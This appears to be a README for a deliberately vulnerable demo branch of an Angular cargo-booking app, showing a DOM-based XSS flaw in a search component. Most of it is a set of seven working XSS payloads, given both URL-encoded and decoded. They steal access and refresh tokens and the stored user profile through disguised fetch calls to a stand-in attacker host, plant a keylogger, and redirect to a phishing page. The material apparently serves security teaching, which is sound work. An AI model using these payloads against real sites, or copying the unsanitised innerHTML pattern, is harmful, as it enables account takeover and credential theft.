# DOM-Based XSS Vulnerability Demo

## Overview

Branch: vulnerability/xss-dom

This branch demonstrates a **DOM-Based Cross-Site Scripting (XSS)** vulnerability in the search results feature. The vulnerability exists in `SearchResultsComponent.ngAfterViewInit()` where user input from the URL query parameter is directly inserted into the DOM using `innerHTML` without sanitization. This bypasses Angular's built-in XSS protection by using vanilla JavaScript DOM manipulation.

## What is DOM-Based XSS?

DOM-Based XSS is a type of Cross-Site Scripting attack where the vulnerability exists in client-side code rather than server-side code. The attack payload is executed as a result of modifying the DOM environment in the victim's browser. Unlike reflected or stored XSS, the malicious payload never reaches the server—it's entirely a client-side attack.

### 1. Proof of Concept - Basic Alert

**Attack Link:**

```
localhost:4200/search?q=<img%20src%3Dx%20onerror%3D"alert(%27XSS%20Vulnerability%20Confirmed%27)">
```

**Payload (decoded):**

```html
<img src=x onerror="alert('XSS Vulnerability Confirmed')">
```

**Impact:** Displays an alert box, proving JavaScript execution. This is typically the first test an attacker performs.

**Note:** The URL encoding makes the link appear less suspicious and is what real attackers would use.

---

### 2. Token Exfiltration - Access Token Theft

**Attack Link:**

```
http://localhost:4200/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2Flocalhost%3A5155%2Fimages%2Fstolen.png%3Ftoken%3D%27%2BlocalStorage.getItem%28%27mbc_access_token%27%29%29%22%3E
```

**Payload (decoded):**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/images/stolen.png?token='+localStorage.getItem('mbc_access_token'))"
/>
```

**How it works:**

1. Retrieves the JWT access token from localStorage
2. Sends it to attacker-controlled server (fake-file-host) as a query parameter
3. Server logs the token for attacker to use later
4. Victim sees normal search page, unaware of the theft

**Impact:** Attacker can impersonate the user until the token expires (typically 15 minutes to 1 hour).

---

### 3. Complete Session Hijacking - All Tokens

**Attack Link:**

```
http://localhost:4200/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2Flocalhost%3A5155%2Fimages%2Fsession.png%3Faccess%3D%27%2BlocalStorage.getItem%28%27mbc_access_token%27%29%2B%27%26refresh%3D%27%2BlocalStorage.getItem%28%27mbc_refresh_token%27%29%29%22%3E
```

**Payload (decoded):**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/images/session.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))"
/>
```

**How it works:**

1. Steals both access token AND refresh token
2. Sends both to attacker's server
3. Attacker can maintain access indefinitely by refreshing the access token

**Impact:** Complete account takeover. Attacker can:

- Access all user data
- Make bookings on behalf of the user
- Change user profile information
- Maintain persistent access even after password changes (until refresh token expires)

---

### 4. Complete User Profile Exfiltration

**Attack Link:**

```
http://localhost:4200/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2Flocalhost%3A5155%2Ffonts%2Fdata.ttf%3Fuser%3D%27%2BencodeURIComponent%28localStorage.getItem%28%27mbc_user%27%29%29%29%22%3E
```

**Payload (decoded):**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/fonts/data.ttf?user='+encodeURIComponent(localStorage.getItem('mbc_user')))"
/>
```

**How it works:**

1. Retrieves serialized user object from localStorage
2. URL-encodes it to handle special characters
3. Sends to attacker as font request (less suspicious in network logs)

**Impact:** Attacker learns:

- User's full name
- Email address
- User ID
- Role (Customer/Pilot/Admin)
- Any other profile information

---

### 5. Stealth Token Theft - Base64 Encoded

**Attack Link:**

```
http://localhost:4200/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27http%3A%2F%2Flocalhost%3A5155%2Fstyles%2Fapp.css%3Fd%3D%27%2Bbtoa%28localStorage.getItem%28%27mbc_access_token%27%29%2B%27%3A%27%2BlocalStorage.getItem%28%27mbc_refresh_token%27%29%29%29%22%3E
```

**Payload (decoded):**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/styles/app.css?d='+btoa(localStorage.getItem('mbc_access_token')+':'+localStorage.getItem('mbc_refresh_token')))"
/>
```

**How it works:**

1. Combines both tokens with a colon separator
2. Base64 encodes the combined string
3. Sends as CSS request (appears more legitimate)

**Impact:** Same as attack #3 but harder to detect in casual log inspection.

---

### 6. Keylogger Injection

**Attack Link:**

```
http://localhost:4200/search?q=%3Cimg%20src%3Dx%20onerror%3D%22document.onkeypress%3Dfunction%28e%29%7Bfetch%28%27http%3A%2F%2Flocalhost%3A5155%2Fscripts%2Fkeys.js%3Fk%3D%27%2Be.key%29%7D%22%3E
```

**Payload (decoded):**

```html
<img
  src="x"
  onerror="document.onkeypress=function(e){fetch('http://localhost:5155/scripts/keys.js?k='+e.key)}"
/>
```

**How it works:**

1. Installs a keylogger on the page
2. Every keystroke is sent to attacker's server
3. Captures passwords, credit card numbers, personal messages, etc.

**Impact:** Captures everything the user types on the site, including:

- Login credentials (if they log out and back in)
- Payment information
- Personal messages
- Delivery details

---

### 7. Phishing Redirect

**Attack Link:**

```
http://localhost:4200/search?q=%3Cimg%20src%3Dx%20onerror%3D%22setTimeout%28function%28%29%7Blocation.href%3D%27http%3A%2F%2Flocalhost%3A5155%2Fimages%2Ffake-login.png%27%7D%2C3000%29%22%3E
```

**Payload (decoded):**

```html
<img
  src="x"
  onerror="setTimeout(function(){location.href='http://localhost:5155/images/fake-login.png'},3000)"
/>
```

**How it works:**

1. Waits 3 seconds (so victim thinks page is loading normally)
2. Redirects to attacker's phishing site
3. Fake site looks like Mango Bay Cargo login page
4. Captures credentials when user "logs in again"

**Impact:** Credential theft through social engineering.
